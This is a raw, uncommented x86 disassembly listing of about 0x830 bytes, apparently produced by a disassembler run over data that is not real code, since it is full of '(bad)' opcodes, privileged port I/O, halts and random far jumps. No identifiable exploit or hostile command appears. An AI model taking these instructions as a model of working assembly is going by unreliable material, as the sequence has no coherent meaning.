  409651:	adc    esi,esi
  409653:	xor    bl,BYTE PTR [eax-0x58]
  409656:	push   edi
  409657:	(bad)  
  409658:	loope  0x4095df
  40965a:	xchg   ecx,eax
  40965b:	xlat   BYTE PTR ds:[ebx]
  40965c:	lock adc eax,0xdc9e0efa
  409662:	xchg   ebx,eax
  409663:	retf   
  409664:	mov    esi,0xb90db376
  409669:	cmp    al,0x3b
  40966b:	push   ecx
  40966c:	jp     0x409623
  40966e:	mov    dl,0x4a
  409670:	mov    edx,0x5f690b6a
  409675:	add    cl,BYTE PTR [eax]
  409677:	in     eax,0x4e
  409679:	or     edi,0xffffffed
  40967c:	inc    ebx
  40967d:	fdivr  DWORD PTR [esi+edx*4-0x3b]
  409681:	leave  
  409682:	push   edx
  409683:	jnp    0x409659
  409685:	fs cdq 
  409687:	add    BYTE PTR [eax-0x5c],0xda
  40968b:	jg     0x409669
  40968d:	aam    0x80
  40968f:	pop    edi
  409690:	mov    ds:0x9e72c784,al
  409695:	stos   BYTE PTR es:[edi],al
  409696:	in     al,0xe8
  409698:	and    al,0x1a
  40969a:	cmp    al,0x16
  40969c:	test   BYTE PTR [eax+0x5b],ah
  40969f:	dec    ecx
  4096a1:	sub    bl,dl
  4096a3:	aas    
  4096a4:	fwait
  4096a5:	stos   BYTE PTR es:[edi],al
  4096a6:	mov    edi,0x1f7940b7
  4096ab:	lahf   
  4096ac:	lods   eax,DWORD PTR ds:[esi]
  4096ad:	mov    bh,0x67
  4096af:	jle    0x4096bf
  4096b1:	xchg   esp,eax
  4096b2:	cld    
  4096b3:	cwde   
  4096b4:	or     ebp,ebx
  4096b6:	mov    WORD PTR [ebp-0x5dd3eb39],ss
  4096bc:	sbb    DWORD PTR [ecx-0x386efc57],ecx
  4096c2:	cmc    
  4096c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096c4:	movnti DWORD PTR [edx-0x225c526f],eax
  4096cb:	pop    esp
  4096cc:	popa   
  4096cd:	sbb    esp,ecx
  4096cf:	aas    
  4096d0:	or     BYTE PTR [ebx],bl
  4096d2:	push   edx
  4096d3:	dec    ecx
  4096d4:	daa    
  4096d5:	addr16 addr16 pop ebp
  4096d8:	xchg   ebx,eax
  4096d9:	clc    
  4096da:	ins    BYTE PTR es:[edi],dx
  4096db:	sbb    edx,DWORD PTR [ebx-0x34]
  4096de:	rcl    BYTE PTR [ebp+0x10],1
  4096e1:	mov    ecx,0x811b8e26
  4096e6:	inc    ebp
  4096e8:	push   0x1d
  4096ea:	mov    ebp,0xa9588580
  4096ef:	ins    DWORD PTR es:[edi],dx
  4096f0:	pop    es
  4096f1:	push   ecx
  4096f2:	mov    al,ds:0x9d2c6544
  4096f7:	clc    
  4096f8:	cmp    esp,0xeddedf7f
  4096fe:	stos   DWORD PTR es:[edi],eax
  4096ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409700:	fcomp  QWORD PTR [esi]
  409702:	mov    ch,0x7b
  409704:	into   
  409705:	jbe    0x40975a
  409707:	and    esi,DWORD PTR [esi+0x40]
  40970a:	hlt    
  40970b:	pop    edx
  40970c:	in     eax,0xf2
  40970e:	mov    ah,0x8d
  409710:	imul   ebp,esi,0x74
  409713:	sub    esi,DWORD PTR [ecx+ebx*1-0x4f290af7]
  40971a:	push   0xffffff94
  40971c:	jle    0x40973a
  40971e:	xchg   DWORD PTR [eax+0x43],esp
  409721:	push   ss
  409722:	mov    ds:0xf08495fd,eax
  409727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409728:	ret    
  409729:	loope  0x4096f0
  40972b:	addr16 daa 
  40972d:	mov    dh,0x3e
  40972f:	dec    eax
  409730:	shl    ecx,1
  409732:	ss ror BYTE PTR ds:[edi],0x1d
  409737:	jmp    0x82d7b5db
  40973c:	hlt    
  40973d:	dec    ebx
  40973e:	test   DWORD PTR [eax-0x12018342],eax
  409744:	outs   dx,DWORD PTR ds:[esi]
  409745:	sub    DWORD PTR [edi+0x1c375e42],eax
  40974b:	xchg   edi,eax
  40974c:	retf   
  40974d:	and    al,0x28
  40974f:	fmul   DWORD PTR [esi+0x1c8d66b]
  409755:	retf   
  409756:	inc    BYTE PTR [esi-0x1eb12009]
  40975c:	fcmovnb st,st(4)
  40975e:	fwait
  40975f:	cld    
  409760:	ret    0x709b
  409763:	hlt    
  409764:	adc    BYTE PTR [eax+0x7036599b],bl
  40976a:	jmp    0x40a7:0xfdbe4b65
  409771:	pop    esi
  409772:	ror    DWORD PTR [edi-0x11],1
  409775:	sbb    dl,bh
  409777:	inc    edx
  409778:	repnz and bl,BYTE PTR [esi-0x4a2653fd]
  40977f:	mov    ch,bl
  409781:	jg     0x409705
  409783:	mov    esp,0xe13c2745
  409788:	jp     0x409774
  40978a:	neg    BYTE PTR [eax+0x49]
  40978d:	popa   
  40978e:	jge    0x409724
  409790:	xor    BYTE PTR [ecx-0x8],ch
  409793:	fst    st(1)
  409795:	lds    edx,FWORD PTR es:[eax-0x33]
  409799:	call   0xaece:0x10e87212
  4097a0:	jb     0x40976e
  4097a2:	(bad)  
  4097a3:	jmp    0x8a9e:0x3dbcdf78
  4097aa:	mov    esp,0x5083662e
  4097af:	pop    es
  4097b0:	ror    ch,0xbe
  4097b3:	push   cs
  4097b4:	dec    esi
  4097b5:	rol    ebx,cl
  4097b7:	push   eax
  4097b8:	test   DWORD PTR [ebp-0x6c],eax
  4097bb:	aam    0x92
  4097bd:	out    0x32,eax
  4097bf:	mov    bl,0x10
  4097c1:	dec    esi
  4097c2:	xchg   DWORD PTR [ecx+0x7e],esi
  4097c5:	push   ebx
  4097c6:	inc    edx
  4097c7:	jo     0x4097f4
  4097c9:	and    al,0x7c
  4097cb:	out    dx,al
  4097cc:	mov    dh,0xd1
  4097ce:	rcr    BYTE PTR [ecx+0x78],1
  4097d1:	cli    
  4097d2:	adc    bh,BYTE PTR [ebx-0x57]
  4097d5:	fmul   DWORD PTR [eax+0x7198429c]
  4097db:	xlat   BYTE PTR ds:[ebx]
  4097dc:	push   edx
  4097dd:	xchg   ebx,eax
  4097de:	xchg   esi,eax
  4097df:	arpl   WORD PTR [eax+ecx*2+0x78b26d85],di
  4097e6:	scas   al,BYTE PTR es:[edi]
  4097e7:	xor    DWORD PTR [edx-0x66],eax
  4097ea:	sbb    dl,dl
  4097ec:	call   0x3321:0x85c42ff7
  4097f3:	jbe    0x40980c
  4097f5:	loopne 0x40981c
  4097f7:	repnz popf 
  4097f9:	ja     0x4097ae
  4097fb:	or     DWORD PTR [ebp+0x53a4685d],edi
  409801:	mov    bl,0xf4
  409803:	and    al,dl
  409805:	lds    edi,FWORD PTR [ebp-0x80]
  409808:	shl    BYTE PTR [edi-0x7c],0x42
  40980c:	and    bl,BYTE PTR [ecx]
  40980e:	or     eax,0x1967a629
  409813:	xchg   DWORD PTR [ebx+0x630e49df],ebp
  409819:	push   es
  40981a:	(bad)  
  40981b:	stc    
  40981c:	js     0x409866
  40981e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981f:	xor    BYTE PTR ds:0x4bef363a,bh
  409825:	iret   
  409826:	xlat   BYTE PTR ds:[ebx]
  409827:	dec    esp
  409828:	into   
  409829:	jmp    0xf5c22794
  40982e:	jmp    0x40983a
  409830:	ror    DWORD PTR fs:[eax+esi*1-0x9087f76],cl
  409838:	retf   0xe8c0
  40983b:	rcl    DWORD PTR ds:0x337ed857,cl
  409841:	pop    ds
  409842:	test   BYTE PTR [ebx+ebx*4+0x2c5e56c7],0x42
  40984a:	loopne 0x4097f5
  40984c:	jg     0x409844
  40984e:	call   0xf08ce3b3
  409853:	cmp    bl,ch
  409855:	mov    esp,0xf14ff0ba
  40985a:	shl    BYTE PTR [edi+0xf],1
  40985d:	outs   dx,BYTE PTR ds:[esi]
  40985e:	push   edx
  40985f:	daa    
  409860:	pop    esi
  409861:	pusha  
  409862:	push   0xfffffffc
  409864:	jmp    edi
  409866:	imul   edx,DWORD PTR [ebx],0x2f
  409869:	inc    ebx
  40986a:	dec    eax
  40986b:	sub    bh,BYTE PTR [edi+edx*8+0x307cb90d]
  409872:	dec    ecx
  409873:	xchg   edi,eax
  409874:	mov    al,ds:0x7eac87a1
  409879:	add    edx,DWORD PTR [ebp+0x740c8b16]
  40987f:	push   0xed41fa26
  409884:	pop    ebx
  409885:	pop    eax
  409886:	push   edx
  409887:	hlt    
  409888:	cli    
  409889:	jnp    0x4098ed
  40988b:	push   edi
  40988c:	imul   bx,WORD PTR [ebp+0x73],0xfff3
  409891:	cmc    
  409892:	mov    al,0xf0
  409894:	mov    ds:0x120d0a4e,eax
  409899:	mov    bl,0x12
  40989b:	and    dh,ah
  40989d:	lods   eax,DWORD PTR ds:[esi]
  40989e:	int3   
  40989f:	cli    
  4098a0:	outs   dx,BYTE PTR ds:[esi]
  4098a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098a3:	dec    ebx
  4098a4:	(bad)  
  4098a5:	aad    0x7b
  4098a7:	mov    ah,BYTE PTR [eax]
  4098a9:	es stc 
  4098ab:	push   0xffffffb2
  4098ad:	sbb    eax,0x41e46d9
  4098b2:	fisubr DWORD PTR [ecx]
  4098b4:	pop    ds
  4098b5:	sti    
  4098b6:	sbb    al,0x3c
  4098b8:	mov    ebx,0xa3918295
  4098bd:	inc    esi
  4098be:	(bad)  
  4098bf:	lock push edx
  4098c1:	pushf  
  4098c2:	or     eax,0xe60c1784
  4098c7:	call   0x6f206293
  4098cc:	sbb    DWORD PTR [edi+0x4b],0x2d
  4098d0:	test   BYTE PTR [edx+0x6a],bl
  4098d3:	pop    ds
  4098d4:	adc    eax,0x97f185e4
  4098d9:	imul   eax,DWORD PTR [ecx-0x551e98ce],0xffffff97
  4098e0:	mov    ds,WORD PTR [esi+ecx*8-0x45]
  4098e4:	pop    ebx
  4098e5:	bound  ecx,QWORD PTR [ebp-0x19]
  4098e8:	es pop ecx
  4098ea:	xchg   DWORD PTR [ebx-0x5461da69],edx
  4098f0:	lock (bad) 
  4098f2:	mov    dh,0x60
  4098f4:	inc    BYTE PTR [esi-0x52]
  4098f7:	sub    DWORD PTR [ebp-0x58],ebp
  4098fa:	mov    al,ds:0x160f92b6
  4098ff:	fidiv  WORD PTR [esi-0x5e]
  409902:	sub    DWORD PTR [esi],0xc8b4a27a
  409908:	and    DWORD PTR [edi+0x6d8c22f6],ebx
  40990e:	in     al,0xc4
  409910:	mov    esi,0xd5e29c35
  409915:	loopne 0x409918
  409917:	mov    ds:0x677beb8,al
  40991c:	jno    0x409971
  40991e:	jae    0x409915
  409920:	mov    edi,0x9c4432c1
  409925:	mov    DWORD PTR [eax-0x6f],edi
  409928:	jae    0x409921
  40992a:	(bad)  
  40992b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40992c:	mov    al,ds:0x82a0aaa0
  409932:	add    al,0x56
  409935:	mov    eax,ds:0x1f04e44
  40993a:	into   
  40993b:	and    ch,BYTE PTR [eax]
  40993d:	cmp    ecx,DWORD PTR [esi-0x45]
  409940:	icebp  
  409941:	aaa    
  409942:	cmp    BYTE PTR [esi-0x60ebab95],0x99
  409949:	push   ds
  40994a:	test   eax,0x90c42369
  40994f:	cdq    
  409950:	push   ecx
  409951:	mov    ch,0xea
  409953:	dec    eax
  409954:	pop    edx
  409955:	push   0x2a
  409957:	sbb    dh,BYTE PTR [ecx]
  409959:	push   ebp
  40995a:	xor    eax,0xd6edc9d9
  40995f:	out    0x92,al
  409961:	cmp    ecx,esi
  409963:	mov    ds:0xad5cb698,al
  409968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409969:	test   DWORD PTR [ecx-0x48d345af],ebx
  40996f:	push   edx
  409970:	sbb    ecx,DWORD PTR [edx]
  409972:	vpinsrw xmm6,xmm2,WORD PTR ds:0x17f072bf,0x83
  40997b:	stos   BYTE PTR es:[edi],al
  40997c:	out    0xe4,al
  40997e:	sar    DWORD PTR [ebx-0x38],1
  409981:	scas   eax,DWORD PTR es:[edi]
  409982:	ins    DWORD PTR es:[edi],dx
  409983:	push   es
  409984:	cmp    al,0xe1
  409986:	mov    al,cl
  409988:	hlt    
  409989:	xchg   edi,eax
  40998a:	pop    esp
  40998b:	stc    
  40998c:	push   edx
  40998d:	fidivr WORD PTR [edx]
  40998f:	pop    ds
  409990:	and    al,al
  409992:	rcl    BYTE PTR [ebp-0x786f71d9],1
  409998:	js     0x4099ee
  40999a:	repnz mov gs,WORD PTR [esi+0x4807eabe]
  4099a1:	loope  0x409a11
  4099a3:	stos   BYTE PTR es:[edi],al
  4099a4:	pop    esp
  4099a5:	daa    
  4099a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099a7:	pusha  
  4099a8:	mov    BYTE PTR [edx],al
  4099aa:	xchg   edi,eax
  4099ab:	stos   DWORD PTR es:[edi],eax
  4099ac:	pop    eax
  4099ad:	xor    WORD PTR ds:0x9d9893f9,si
  4099b4:	int    0xab
  4099b6:	sahf   
  4099b7:	dec    edi
  4099b8:	push   edi
  4099b9:	or     ebx,DWORD PTR [ecx+0x4a]
  4099bc:	scas   eax,DWORD PTR es:[edi]
  4099bd:	mov    dh,0xcf
  4099bf:	and    eax,0x2ee39058
  4099c4:	fst    QWORD PTR [edx+ebx*2-0x54530b3d]
  4099cb:	out    0x96,eax
  4099cd:	ror    BYTE PTR [ebx+0x534f4039],1
  4099d3:	(bad)  
  4099d4:	dec    esi
  4099d5:	mov    cl,0x6f
  4099d7:	jno    0x4099c7
  4099d9:	xchg   ecx,ebp
  4099db:	or     edi,DWORD PTR ds:0x7ce3853c
  4099e1:	clc    
  4099e2:	inc    ebx
  4099e3:	xchg   esp,eax
  4099e4:	dec    eax
  4099e5:	ds xchg ecx,eax
  4099e7:	fmul   QWORD PTR [edi+0x6d3f71aa]
  4099ed:	sub    DWORD PTR [eax+0x76],0x5b
  4099f1:	ret    0x1fbb
  4099f4:	dec    edx
  4099f5:	mov    eax,ds:0xc530dfb3
  4099fa:	test   eax,0x8e41e554
  4099ff:	jmp    0x409a02
  409a01:	dec    ebx
  409a02:	cmp    al,0xe8
  409a04:	xchg   DWORD PTR [edx-0x7a13ea4e],esp
  409a0a:	inc    ecx
  409a0b:	push   esp
  409a0c:	push   ebx
  409a0d:	adc    DWORD PTR [edx-0x58],eax
  409a10:	and    eax,0xd4edcb79
  409a15:	and    DWORD PTR [esi-0x49bf4620],0x7
  409a1c:	xchg   DWORD PTR [ecx-0x2e6b7845],esi
  409a22:	pop    esp
  409a23:	adc    al,0x4
  409a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a26:	inc    ebp
  409a27:	push   ecx
  409a28:	xchg   ebp,eax
  409a29:	add    eax,0xb359beb3
  409a2e:	imul   dl
  409a30:	aaa    
  409a31:	inc    ecx
  409a32:	sub    al,0xcb
  409a34:	mov    ds:0xcadd2e66,al
  409a39:	dec    ebx
  409a3a:	jo     0x409a77
  409a3c:	bts    DWORD PTR [edx],0x80
  409a40:	adc    ebx,DWORD PTR [esi]
  409a42:	dec    esi
  409a43:	jg     0x4099f4
  409a45:	cs jp  0x409aab
  409a48:	pushf  
  409a49:	fst    st(1)
  409a4b:	in     al,dx
  409a4c:	and    DWORD PTR [edx+0x12402ebe],esp
  409a52:	dec    ebp
  409a53:	mov    ds:0xc312ff95,al
  409a58:	aaa    
  409a59:	sbb    edi,DWORD PTR [esi-0x6f]
  409a5c:	clc    
  409a5d:	js     0x409a72
  409a5f:	xchg   esi,eax
  409a60:	pop    esp
  409a61:	dec    edi
  409a62:	or     BYTE PTR [ebp-0x6df461ca],ch
  409a68:	js     0x4099ea
  409a6a:	cli    
  409a6b:	bound  edx,QWORD PTR [ebx]
  409a6d:	out    0xd5,eax
  409a6f:	inc    ecx
  409a70:	jmp    FWORD PTR [edi+0x7cbc3673]
  409a76:	test   DWORD PTR [edi],ecx
  409a78:	pop    eax
  409a79:	mov    edx,0x88ee8857
  409a7e:	pop    ebx
  409a7f:	xchg   ebx,eax
  409a80:	jmp    0x409aa0
  409a82:	mov    ds:0xdd7c959c,eax
  409a87:	(bad)  
  409a88:	mov    al,ds:0x6ba5dda
  409a8d:	inc    esi
  409a8e:	dec    edi
  409a8f:	xchg   esp,eax
  409a90:	mov    DWORD PTR [esi-0x5f2c6445],ebp
  409a96:	loopne 0x409ac3
  409a98:	jp     0x409ae1
  409a9a:	or     DWORD PTR [edi-0x4dd32a12],edx
  409aa0:	mov    al,0x90
  409aa2:	jmp    0x5453bc5d
  409aa7:	pop    ds
  409aa8:	fcomp  DWORD PTR ds:0x1763
  409aad:	test   DWORD PTR [ebx],esp
  409aaf:	loope  0x409ad6
  409ab1:	out    0x2,al
  409ab3:	(bad)  
  409ab4:	and    ch,ch
  409ab6:	sub    eax,0x4ee89019
  409abb:	or     edi,DWORD PTR [edx+edx*2]
  409abe:	jae    0x409a6c
  409ac0:	xchg   ah,ch
  409ac2:	xchg   BYTE PTR [eax-0x7462c2bd],bh
  409ac8:	pusha  
  409ac9:	mov    WORD PTR [ebx-0x9bc2876],ds
  409acf:	fs push ds
  409ad1:	rcr    BYTE PTR [edx-0x3e9a09cf],0xa0
  409ad8:	adc    DWORD PTR [edx],esp
  409ada:	cmp    DWORD PTR [edx-0x23],ecx
  409add:	sub    dl,BYTE PTR [edi]
  409adf:	pusha  
  409ae0:	fldz   
  409ae2:	lds    ecx,FWORD PTR [edx-0x5d39654]
  409ae8:	sti    
  409ae9:	sub    al,BYTE PTR [esi+0x70]
  409aec:	sbb    al,0x30
  409aee:	inc    esp
  409aef:	inc    ebp
  409af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af1:	hlt    
  409af2:	push   0xc9f13d65
  409af7:	cmp    ah,BYTE PTR [edx]
  409af9:	jl     0x409ac1
  409afb:	inc    esi
  409afc:	jg     0x409b1f
  409afe:	jns    0x409b2e
  409b00:	adc    al,0xf3
  409b02:	sar    DWORD PTR [esi+0x17d545d7],1
  409b08:	outs   dx,DWORD PTR ds:[esi]
  409b09:	add    DWORD PTR [ebp-0x7c12b7ae],0x2eb09346
  409b13:	push   esp
  409b14:	pop    esi
  409b15:	cld    
  409b16:	fstp   QWORD PTR ds:0x5e53cbb
  409b1c:	jb     0x409aa4
  409b1e:	test   eax,0x321f08c9
  409b23:	sub    eax,0x577a0d38
  409b28:	mov    edi,0x7fe18ec9
  409b2d:	dec    edx
  409b2e:	adc    eax,DWORD PTR [edi-0x67]
  409b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b32:	mov    bl,0x99
  409b34:	fwait
  409b35:	aas    
  409b36:	xchg   ecx,eax
  409b37:	and    esp,edx
  409b39:	test   eax,0x1acf4f7
  409b3e:	dec    ebx
  409b3f:	in     al,dx
  409b40:	push   ebx
  409b41:	outs   dx,DWORD PTR ds:[esi]
  409b42:	repz pop ebx
  409b44:	push   esp
  409b45:	jns    0x409baa
  409b47:	adc    eax,0x5d29518d
  409b4c:	test   eax,0x24328e8b
  409b51:	ret    
  409b52:	dec    ebx
  409b53:	sub    DWORD PTR [esi],ebx
  409b55:	fmul   DWORD PTR [edx-0x58]
  409b58:	test   eax,0xce686442
  409b5d:	pop    ebx
  409b5e:	cmc    
  409b5f:	xchg   esi,eax
  409b60:	pushf  
  409b61:	ror    DWORD PTR [ebp+0x10],1
  409b64:	imul   esp,DWORD PTR [edi-0xdc02611],0xffffffa5
  409b6b:	add    eax,0x6b675192
  409b70:	jecxz  0x409b6c
  409b72:	cwde   
  409b73:	mov    eax,ds:0x58864315
  409b78:	hlt    
  409b79:	xlat   BYTE PTR ds:[ebx]
  409b7a:	xchg   esp,eax
  409b7b:	cmp    eax,0x2aff2c87
  409b80:	sub    eax,DWORD PTR [ebp-0x6ba1e064]
  409b86:	(bad)  [ecx]
  409b88:	and    eax,0x8d681a79
  409b8d:	sahf   
  409b8e:	or     bl,BYTE PTR [ebp+esi*4-0x35]
  409b92:	add    ebp,DWORD PTR [eax]
  409b94:	aam    0xea
  409b96:	inc    ebx
  409b97:	and    cl,BYTE PTR [edx+0x6b]
  409b9a:	add    DWORD PTR [edx],edi
  409b9c:	loop   0x409bd4
  409b9e:	loopne 0x409c16
  409ba0:	cmp    eax,0x4d70f681
  409ba5:	out    0x79,al
  409ba7:	pop    ss
  409ba8:	inc    eax
  409ba9:	popf   
  409baa:	xor    eax,0xcaf17a8a
  409baf:	scas   al,BYTE PTR es:[edi]
  409bb0:	or     bl,ah
  409bb2:	mov    eax,ds:0x81bef0a2
  409bb7:	mov    al,ds:0x4b50348
  409bbc:	std    
  409bbd:	mov    ds,WORD PTR [ecx+0x12]
  409bc0:	call   0xc947686d
  409bc5:	jne    0x409c46
  409bc7:	jbe    0x409bc6
  409bc9:	mov    eax,0xee9a0b81
  409bce:	out    0x5f,eax
  409bd0:	fs fadd st,st(3)
  409bd3:	in     al,0x6a
  409bd5:	mov    ah,BYTE PTR [ecx+0x75]
  409bd8:	rol    BYTE PTR [eax],1
  409bda:	inc    edx
  409bdb:	mul    BYTE PTR [ebx]
  409bdd:	leave  
  409bde:	pop    es
  409bdf:	loop   0x409ba2
  409be1:	cwde   
  409be2:	outs   dx,DWORD PTR ds:[esi]
  409be3:	sub    esi,DWORD PTR [esi+0x12]
  409be6:	es xor eax,0x9db50f5b
  409bec:	lods   eax,DWORD PTR ds:[esi]
  409bed:	shl    BYTE PTR [edi],0x62
  409bf0:	fidiv  DWORD PTR [edi]
  409bf2:	int3   
  409bf3:	jl     0x409c1c
  409bf5:	addr16 nop
  409bf7:	mov    dl,0xa1
  409bf9:	push   ecx
  409bfa:	xchg   DWORD PTR [edi],eax
  409bfc:	jns    0x409c53
  409bfe:	jmp    0x409c10
  409c00:	arpl   WORD PTR [ebp-0x61842882],dx
  409c06:	call   0xe796:0xaedfd1d1
  409c0d:	mov    ecx,0xfe137111
  409c12:	icebp  
  409c13:	pop    ds
  409c14:	test   eax,0xf386ae7e
  409c19:	mov    eax,ds:0xb60c3036
  409c1e:	ins    DWORD PTR es:[edi],dx
  409c1f:	repz cwde 
  409c21:	std    
  409c22:	lods   al,BYTE PTR ds:[esi]
  409c23:	fisubr WORD PTR [ebp+0x5153544c]
  409c29:	push   edi
  409c2a:	stc    
  409c2b:	dec    ebp
  409c2c:	push   esp
  409c2d:	inc    esp
  409c2e:	repnz es dec eax
  409c31:	cdq    
  409c32:	push   ds
  409c33:	inc    ecx
  409c34:	sbb    al,0x97
  409c36:	cli    
  409c37:	daa    
  409c38:	lods   al,BYTE PTR ds:[esi]
  409c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3a:	adc    bl,ch
  409c3c:	add    DWORD PTR [ebx+0x2b],ecx
  409c3f:	push   ebp
  409c40:	jecxz  0x409be5
  409c42:	mov    edx,0x3e92643b
  409c47:	imul   eax,eax,0xffffff9d
  409c4a:	and    BYTE PTR [ebp-0x76],ah
  409c4d:	clc    
  409c4e:	inc    esp
  409c4f:	dec    DWORD PTR [ecx+0x6e5ac40a]
  409c55:	mov    BYTE PTR [edi+0x7d],cl
  409c58:	adc    esp,0xffffffd7
  409c5b:	pop    ebx
  409c5c:	pusha  
  409c5d:	cmp    ch,BYTE PTR [ebp-0x45]
  409c60:	mov    ecx,0x36188288
  409c65:	or     BYTE PTR [edi-0x5693606c],0xb3
  409c6c:	xchg   esp,eax
  409c6d:	and    eax,0x6f733128
  409c72:	call   0x86a42c0f
  409c77:	xchg   edi,eax
  409c78:	sar    eax,0x8d
  409c7b:	mul    BYTE PTR [ebp+0x846b503]
  409c81:	cmp    eax,0x3b81f61b
  409c86:	pop    edx
  409c87:	jl     0x409c0b
  409c89:	add    eax,0xe0b04b29
  409c8e:	clc    
  409c8f:	pushf  
  409c90:	pop    eax
  409c91:	fmul   st,st(7)
  409c93:	mov    ebx,0x2c
	...
  409d14:	adc    ecx,DWORD PTR ds:0xf7be76a8
  409d1a:	fild   QWORD PTR [ebp-0x8]
  409d1d:	out    0xa8,al
  409d1f:	repz mov ebp,0xe60fb1ef
  409d25:	dec    edi
  409d26:	add    BYTE PTR [eax],al
  409d28:	imul   eax,DWORD PTR [edi],0x31b40000
  409d2e:	leave  
  409d2f:	add    edi,eax
  409d31:	add    BYTE PTR [ecx-0x392fa037],dh
  409d37:	xor    ebx,esp
  409d39:	outs   dx,DWORD PTR ds:[esi]
  409d3a:	icebp  
  409d3b:	out    dx,al
  409d3c:	lahf   
  409d3d:	jmp    0xa00af1e
  409d42:	stos   BYTE PTR es:[edi],al
  409d43:	loopne 0x409cf8
  409d45:	push   edx
  409d46:	cmp    esp,DWORD PTR [esi+0x2e203193]
  409d4c:	ret    0xbc5b
  409d4f:	loope  0x409d9b
  409d51:	dec    ecx
  409d52:	dec    ebp
  409d53:	fwait
  409d54:	repnz pop eax
  409d56:	ret    
  409d57:	enter  0x70d6,0x62
  409d5b:	ror    BYTE PTR [edx+eax*2+0x32d29d97],1
  409d62:	and    al,0x55
  409d64:	stos   BYTE PTR es:[edi],al
  409d65:	add    edi,ebx
  409d67:	sub    al,0x94
  409d69:	clc    
  409d6a:	sub    ecx,DWORD PTR [esi]
  409d6c:	or     bh,BYTE PTR [ebx+0x35756e79]
  409d72:	sbb    DWORD PTR [eax-0x4c],ecx
  409d75:	or     edi,ebp
  409d77:	sub    dl,BYTE PTR [esp+ebp*1]
  409d7a:	xchg   ebx,eax
  409d7b:	sbb    DWORD PTR [esi],edx
  409d7d:	call   0x26da:0x65300907
  409d84:	pop    esp
  409d85:	(bad)  
  409d86:	and    BYTE PTR [edi-0x42],ch
  409d89:	sbb    eax,0xeb631bfc
  409d8e:	mov    esi,0x48bf24f8
  409d93:	retf   0xe301
  409d96:	ret    
  409d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d98:	popf   
  409d99:	sub    DWORD PTR [edx],0x9512207
  409d9f:	mov    ebp,esp
  409da1:	mov    al,ds:0x34fd4aa2
  409da6:	add    BYTE PTR [ecx+0x2f],ah
  409da9:	xor    al,0x4b
  409dab:	mov    DWORD PTR [ebx],ebp
  409dad:	(bad)  
  409dae:	mov    bl,0xc
  409db0:	xchg   ecx,eax
  409db1:	rol    BYTE PTR [esi-0x23],1
  409db4:	cmp    DWORD PTR [ecx-0x2a],ebp
  409db7:	xchg   ebp,eax
  409db8:	enter  0x4071,0x8a
  409dbc:	sti    
  409dbd:	aam    0x83
  409dbf:	aam    0x37
  409dc1:	daa    
  409dc2:	inc    esi
  409dc3:	xchg   BYTE PTR [esi+0x1a6a6250],ah
  409dc9:	mov    bl,0xbf
  409dcb:	push   edx
  409dcc:	idiv   DWORD PTR [eax+0x569745e2]
  409dd2:	or     esp,DWORD PTR [ecx+ebx*1+0x6a]
  409dd6:	sub    bh,BYTE PTR [ebp+0x5fa05643]
  409ddc:	sbb    BYTE PTR [edi+edi*1-0x71aa8a8],al
  409de3:	jns    0x409d90
  409de5:	mov    ecx,0xe831d77f
  409dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409deb:	inc    ecx
  409dec:	dec    esp
  409ded:	inc    esp
  409dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409def:	lds    esi,FWORD PTR [edx+0x1d29f97e]
  409df5:	int    0xb6
  409df7:	(bad)
  409dfa:	data16 cmc 
  409dfc:	fisub  DWORD PTR [eax+0x26958246]
  409e02:	out    dx,eax
  409e03:	(bad)  
  409e04:	(bad)  
  409e05:	adc    ah,BYTE PTR [ecx+ebx*1]
  409e08:	jno    0x409e1e
  409e0a:	add    BYTE PTR [esi+0x74],bh
  409e0d:	rol    bl,0xab
  409e10:	outs   dx,DWORD PTR ds:[esi]
  409e11:	mov    ch,0x7
  409e13:	xor    DWORD PTR [ebp+0x1ff41d36],edx
  409e19:	hlt    
  409e1a:	stos   BYTE PTR es:[edi],al
  409e1b:	into   
  409e1c:	lea    ebp,[edx+0xb]
  409e1f:	push   cs
  409e20:	add    ah,cl
  409e22:	adc    esi,esp
  409e24:	adc    bh,bh
  409e26:	mov    ecx,DWORD PTR [ebp+0x71eacb30]
  409e2c:	jle    0x409e15
  409e2e:	int3   
  409e2f:	or     al,0xb5
  409e31:	dec    ebx
  409e32:	out    dx,al
  409e33:	leave  
  409e34:	test   al,0xc0
  409e36:	jnp    0x409ddb
  409e38:	push   ss
  409e39:	adc    esp,DWORD PTR [ecx]
  409e3b:	loope  0x409dc1
  409e3d:	xchg   edx,eax
  409e3e:	xlat   BYTE PTR ds:[ebx]
  409e3f:	leave  
  409e40:	fpatan 
  409e42:	sub    ch,BYTE PTR [ecx+0x69]
  409e45:	xor    cl,BYTE PTR [ebx+0x19f70b79]
  409e4b:	xchg   esp,eax
  409e4c:	push   ecx
  409e4d:	(bad)  
  409e4e:	or     eax,0xfd2b7c19
  409e53:	ins    DWORD PTR es:[edi],dx
  409e54:	dec    ebx
  409e55:	jmp    0xe9cdf83a
  409e5a:	jmp    0x409e05
  409e5c:	dec    edx
  409e5d:	sub    bh,BYTE PTR [edx+0x4e]
  409e60:	je     0x409e74
  409e62:	add    eax,0xf5d242af
  409e67:	je     0x409e7c
  409e69:	dec    eax
  409e6a:	daa    
  409e6b:	ins    BYTE PTR es:[edi],dx
  409e6c:	xlat   BYTE PTR ds:[ebx]
  409e6d:	xchg   ebp,eax
  409e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e6f:	jns    0x409eac
  409e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e72:	jge    0x409e6d
  409e74:	mov    al,al
  409e76:	fwait
  409e77:	pop    es
  409e78:	add    eax,0x32bf11b4
  409e7d:	mov    edi,0xe837faf4
  409e82:	pop    ebx
